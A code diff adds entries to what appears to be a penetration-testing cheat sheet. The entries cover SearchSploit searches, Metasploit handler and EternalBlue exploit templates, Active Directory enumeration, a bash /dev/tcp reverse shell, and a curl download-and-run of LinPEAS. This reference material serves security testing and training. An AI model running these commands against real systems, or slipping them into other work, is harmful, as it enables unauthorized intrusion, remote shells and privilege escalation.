@@ -138,6 +138,35 @@ export const CHEATSHEET = [
     ]
   },
   {
+    tool: 'SearchSploit / Exploit-DB',
+    link: 'https://www.exploit-db.com',
+    categories: [
+      {
+        name: 'Exploit Research',
+        flags: [
+          { flag: 'searchsploit apache 2.4', desc: 'Search local Exploit-DB mirror for Apache 2.4 exploits' },
+          { flag: 'searchsploit smb', desc: 'Search SMB-related public exploits' },
+          { flag: 'searchsploit CVE-2024-0000', desc: 'Search by CVE identifier' },
+          { flag: 'searchsploit -m 00000', desc: 'Mirror a selected exploit locally' }
+        ]
+      }
+    ]
+  },
+  {
+    tool: 'Metasploit',
+    link: 'https://docs.metasploit.com',
+    categories: [
+      {
+        name: 'Templates',
+        flags: [
+          { flag: 'msfconsole -q -x "search type:exploit name:smb; exit"', desc: 'Search modules quickly' },
+          { flag: 'msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run"', desc: 'Meterpreter handler template' },
+          { flag: 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run"', desc: 'Windows SMB exploit template' }
+        ]
+      }
+    ]
+  },
+  {
     tool: 'Hydra',
     categories: [
       {
@@ -248,6 +277,28 @@ export const CHEATSHEET = [
           { flag: '--no-recursion', desc: 'Disable recursive scanning' },
           { flag: '-t 50', desc: 'Number of threads' },
           { flag: '-o out.txt', desc: 'Save output to file' }
+        ]
+      }
+    ]
+  },
+  {
+    tool: 'Privilege Escalation',
+    categories: [
+      {
+        name: 'Windows / AD',
+        flags: [
+          { flag: 'whoami /priv', desc: 'Check Windows privileges' },
+          { flag: 'net user /domain', desc: 'List domain users' },
+          { flag: 'nltest /dclist:{domain}', desc: 'Enumerate domain controllers' },
+          { flag: 'bloodhound-python -d {domain} -u {user} -p {password} -gc {target} -c All', desc: 'Collect BloodHound data' }
+        ]
+      },
+      {
+        name: 'Post-Exploitation',
+        flags: [
+          { flag: 'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"', desc: 'Bash reverse shell template' },
+          { flag: 'powershell -nop -c "<reverse shell here>"', desc: 'PowerShell reverse shell placeholder' },
+          { flag: 'curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh', desc: 'Run LinPEAS' }
         ]
       }
     ]
